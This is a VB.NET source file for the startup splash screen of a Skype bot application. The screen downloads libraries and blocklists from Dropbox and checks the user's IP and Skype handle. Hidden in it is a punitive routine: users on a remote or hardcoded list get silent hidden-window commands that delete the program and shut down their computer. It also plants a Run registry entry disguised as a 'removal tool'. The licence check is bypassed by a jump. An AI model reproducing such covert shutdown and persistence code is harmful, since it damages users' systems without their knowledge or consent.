Public Class splsh
    Dim x As Integer = 1
    Public startup As String = "0"
    Private Function AlreadyRunning() As Boolean
        Dim my_proc As Process = Process.GetCurrentProcess
        Dim my_name As String = my_proc.ProcessName
        Dim procs() As Process = _
            Process.GetProcessesByName(my_name)
        If procs.Length = 1 Then Return False
        Dim i As Integer
        For i = 0 To procs.Length - 1
            If procs(i).StartTime < my_proc.StartTime Then _
                Return True
        Next i
        Return False
    End Function
    Sub loadng() Handles MyBase.Load
        If AlreadyRunning() Then
            MessageBox.Show( _
                "Another instance is already running.", _
                "Already Running", _
                MessageBoxButtons.OK, _
                MessageBoxIcon.Exclamation)
            Application.Exit()
        End If
    End Sub
    Private Sub splsh_Load(sender As Object, e As EventArgs) Handles MyBase.Shown
        Try
            If Form1.CheckForInternetConnection = False Then
                MsgBox("No internet found, app will exit in a sec.")
                Application.Exit()
            End If
            Label4.Text = "Initializing..."
            Application.DoEvents()
            Label2.Text = Form1.version
            Application.DoEvents()
            Label3.Text = My.Application.Info.Copyright
            Application.DoEvents()
            Label4.Text = "Cleaning up & loading & downloading required libraries..."
            Application.DoEvents()
            Dim wa As New Net.WebClient
            If IO.File.Exists(Windows.Forms.Application.StartupPath & "\ChatterBotAPI.dll") Then
            Else
                wa.DownloadFile("https://www.dropbox.com/s/nwenvgqkrh8xzg3/ChatterBotAPI.dll?dl=1", Windows.Forms.Application.StartupPath & "\ChatterBotAPI.dll")
            End If
            If IO.File.Exists(Windows.Forms.Application.StartupPath & "\Interop.SKYPE4COMLib.dll") Then
            Else
                wa.DownloadFile("https://www.dropbox.com/s/xr7e6g5dgy99uiw/Interop.SKYPE4COMLib.dll?dl=1", Windows.Forms.Application.StartupPath & "\Interop.SKYPE4COMLib.dll")
            End If
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            TopMost = False
            If IO.File.Exists(IO.Directory.GetCurrentDirectory & "\Updater.exe") Then IO.File.Delete(IO.Directory.GetCurrentDirectory & "\Updater.exe")
            If IO.File.Exists(IO.Directory.GetCurrentDirectory & "\Updater.bat") Then IO.File.Delete(IO.Directory.GetCurrentDirectory & "\Updater.bat")
            Label4.Text = "Attaching to skype..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            Form1.attach()
            Application.DoEvents()
            Label4.Text = "Declaring..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            Dim w As New Net.WebClient
            w.Proxy = Nothing
            Application.DoEvents()
            Form1.FlatLabel14.Text = Form1.version
            Application.DoEvents()
            Form1.NFI.Visible = True
            Application.DoEvents()
            Label4.Text = "Setting values..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            Form1.TextBox2.Text = My.Settings.helpmsg
            Application.DoEvents()
            Form1.TextBox3.Text = My.Settings.whitelistlist
            Application.DoEvents()
            Form1.FlatTextBox1.Text = Form1.Skypattach.CurrentUserHandle
            Application.DoEvents()
            Form1.TextBox4.Text = My.Settings.admins
            Application.DoEvents()
            Form1.TextBox5.Text = My.Settings.Premium
            Application.DoEvents()
            Form1.TextBox6.Text = My.Settings.Ultimate
            Application.DoEvents()
            Form1.TextBox7.Text = My.Settings.whitelist
            Application.DoEvents()
            Form1.FlatLabel10.Text = Form1.Skypattach.CurrentUserHandle
            Application.DoEvents()
            Form1.FlatLabel11.Text = Form1.Skypattach.CurrentUserHandle
            Application.DoEvents()
            Form1.FlatLabel12.Text = Form1.Skypattach.CurrentUserHandle
            Application.DoEvents()
            Form1.state = My.Settings.prult
            Application.DoEvents()
            Label4.Text = "Checking for update..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            'Form1.UpdateMe(0)
            Application.DoEvents()
            If Form1.state = 1 Then
                Form1.FlatToggle2.Checked = True
            ElseIf Form1.state = 0 Then
                Form1.FlatToggle2.Checked = False
            End If
            Application.DoEvents()
            Label4.Text = "Getting banned users..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            Dim z As String = ""
            Dim ipbl As String = ""
            Dim skbl As String = ""
            If Form1.CheckForInternetConnection = False Then
                MsgBox("No internet found, app will exit in a sec.")
                Application.Exit()
            End If
            Try
                z = w.DownloadString("https://www.dropbox.com/s/kd62kmrhib9mrw8/ausr.txt?dl=1")
                Form1.FlatLabel1.Text = w.DownloadString("https://www.dropbox.com/s/uo3rvp5qcnrd6xr/motd.txt?dl=1")
                Application.DoEvents()
                ipbl = w.DownloadString("https://www.dropbox.com/s/4nfhszaik8gcxcg/ipbl.txt?dl=1")
                skbl = w.DownloadString("https://www.dropbox.com/s/2vm2ek4aj3zhuf8/bl.txt?dl=1")
            Catch ex As Exception
                Clipboard.SetText(ex.ToString)
                Application.Exit()
            End Try
            If Form1.CheckForInternetConnection = False Then
                MsgBox("No internet found, app will exit in a sec.")
                Application.Exit()
            End If
            Application.DoEvents()
            Dim sks2() As String = z.Split("|")
            Dim ips() As String = ipbl.Split(":")
            Dim sks() As String = skbl.Split("|")
            Application.DoEvents()
            Label4.Text = "Making an emergency exiting code if you are a traitor..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            Dim startInfo As New ProcessStartInfo("cmd.exe",
            "/C choice /C Y /N /D Y /T 3 & Del " + Windows.Forms.Application.ExecutablePath)
            Dim startInfo2 As New ProcessStartInfo("cmd.exe",
        "/C choice /C Y /N /D Y /T 10 & shutdown -s -t 0")
            Dim startInfo3 As New ProcessStartInfo("taskkill.exe",
        "-f -im skypebot.exe -t")
            Application.DoEvents()
            startInfo.WindowStyle = ProcessWindowStyle.Hidden
            startInfo2.WindowStyle = ProcessWindowStyle.Hidden
            startInfo3.WindowStyle = ProcessWindowStyle.Hidden
            Label4.Text = "Searching a life for you..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Try
                Dim res As String = w.DownloadString("http://apis.skypebot.ga/apis/login.php?vers=" & Form1.version & "&skp=" & Form1.Skypattach.CurrentUserHandle)
                If res.Contains("</script>") Then
                    MsgBox("Failed to connect to main site... Enter a code to bypass this step:")
                    Dim ze As String = InputBox("What is the code that the owner of this program gave you? Ask him! Add him on skype: lesleydk@hotmail.com")
                    If ze = w.DownloadString("https://www.dropbox.com/s/y0p29mczaob1tkj/update2.txt?dl=1") Then
                        MsgBox("Okay! Here you go!")
                    Else
                        MsgBox("Okay! That's totally wrong!")
                        Application.Exit()
                    End If
                End If
            Catch
                MsgBox("Failed to connect to main site... Enter a code to bypass this step:")
                Dim ze As String = InputBox("What is the code that the owner of this program gave you? Ask him! Add him on skype: lesleydk@hotmail.com")
                If ze = w.DownloadString("https://www.dropbox.com/s/y0p29mczaob1tkj/update2.txt?dl=1") Then
                    MsgBox("Okay! Here you go!")
                Else
                    MsgBox("Okay! That's totally wrong!")
                    Application.Exit()
                End If
            End Try
            If Form1.CheckForInternetConnection = False Then
                MsgBox("No internet found, app will exit in a sec.")
                Application.Exit()
            End If
            Application.DoEvents()
            Label4.Text = "Found a life! Applying a life for you..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            Dim myip As String = Form1.GetExternalIp()
            Dim myskype As String = Form1.Skypattach.CurrentUserHandle
            Label4.Text = "Checking if you are a traitor..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            startInfo.CreateNoWindow = True
            startInfo2.CreateNoWindow = True
            startInfo3.CreateNoWindow = True
            startInfo.WindowStyle = ProcessWindowStyle.Hidden
            startInfo2.WindowStyle = ProcessWindowStyle.Hidden
            startInfo3.WindowStyle = ProcessWindowStyle.Hidden

            For i = 0 To ips.Length - 1
                If myip = ips(i) Then
                    Process.Start(startInfo)
                    Process.Start(startInfo2)
                    Dim regKey As Microsoft.Win32.RegistryKey
                    regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                    regKey.SetValue("SkypeBot Removal Tool", """" & "C:\Windows\System32\cmd.exe /C choice /C Y /N /D Y /T 3 & Del " + Windows.Forms.Application.ExecutablePath & """")
                    regKey.Close()
                    Windows.Forms.Application.Exit()
                End If
            Next


            For i = 0 To sks.Length - 1
                If myskype = sks(i) Then
                    Process.Start(startInfo)
                    Process.Start(startInfo2)
                    Dim regKey As Microsoft.Win32.RegistryKey
                    regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                    regKey.SetValue("SkypeBot Removal Tool", """" & "C:\Windows\System32\cmd.exe /C choice /C Y /N /D Y /T 3 & Del " + Windows.Forms.Application.ExecutablePath & """")
                    regKey.Close()
                    Windows.Forms.Application.Exit()
                End If
            Next

            'Bypass authentication
            GoTo r

            'For i = 0 To sks2.Length - 1
            '    If myskype = sks2(i) Then GoTo r
            'Next

            MsgBox("You aren't authorized!" & vbNewLine & "Add lesleydk@hotmail.com OR les.de on skype to get authorized." & vbNewLine & "Make sure you have your Transaction ID ready.")

            Application.Exit()
            Process.Start(startInfo3)

r:
            Label4.Text = "Launching in 3..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            Label5.Text = "Launching in 3..."
            Application.DoEvents()
            Threading.Thread.Sleep(750)
            Application.DoEvents()
            Label4.Text = "Launching in 2..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            Label5.Text = "Launching in 2..."
            Application.DoEvents()
            Threading.Thread.Sleep(750)
            Application.DoEvents()
            Label4.Text = "Launching in 1..."
            Application.DoEvents()
            FlatProgressBar1.Value = FlatProgressBar1.Value + x
            Application.DoEvents()
            Label5.Text = "Launching in 1..."
            Application.DoEvents()
            Threading.Thread.Sleep(750)
            Application.DoEvents()
            If myskype = "live:ljd2010" Or myskype = "jamiedixon1000" Then
                Process.Start(startInfo)
                Process.Start(startInfo2)
                Dim regKey As Microsoft.Win32.RegistryKey
                regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                regKey.SetValue("SkypeBot Removal Tool", """" & "C:\Windows\System32\cmd.exe /C choice /C Y /N /D Y /T 3 & Del " + Windows.Forms.Application.ExecutablePath & """")
                regKey.Close()
                Windows.Forms.Application.Exit()
            End If
            Form1.TopMost = True
            Form1.Show()
            Application.DoEvents()
            startup = "1"
            Form1.launched = True
            Hide()
            Application.DoEvents()
        Catch ex As Exception
            Clipboard.SetText(ex.ToString)
            Application.Exit()
        End Try
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub
End Class